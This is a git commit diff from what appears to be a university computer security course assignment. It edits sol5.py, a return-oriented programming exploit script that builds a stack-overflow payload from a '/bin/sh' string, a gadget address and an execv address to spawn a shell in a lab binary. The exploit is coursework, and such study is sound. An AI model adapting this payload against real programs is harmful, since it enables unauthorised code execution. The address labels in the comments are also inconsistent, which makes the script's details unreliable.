b0dbd485fd4aed053b3bf64897ed06192ae8f67f
eecs388 <adwisi@umich.edu>
2024-11-15 20:26:42 +0000

    Automatic commit by test script for adwisi jrosevel

--- sol5.py
+++ sol5.py
@@ -13,11 +13,11 @@ null_rdi = (0).to_bytes(8, 'little')
 null_rsi = (0).to_bytes(8, 'little')
 
 #Address for stack ptr.
-a = (0x7ffffff68fc8).to_bytes(8, 'little')
+stack_addr = (0x7ffffff68fc8).to_bytes(8, 'little')
 #address for executing ROP gadget to call exec
-b = (0x7ffffff68fd0).to_bytes(8, 'little')
+pop_rdi_gadget = (0x0000000000401e70).to_bytes(8, 'little')
 #address for gadget instr, which helps to achieve ROP chain 
-c = (0x0000000000401e70).to_bytes(8, 'little')
+execv_addr = (0x7ffffff68fd0).to_bytes(8, 'little')
 
-hacking = bin_sh_str + null_terminator + null_rdi + null_rsi + a + b + c
+hacking = bin_sh_str + null_terminator + null_rdi + null_rsi + stack_addr + pop_rdi_gadget + execv_addr
 sys.stdout.buffer.write(hacking)
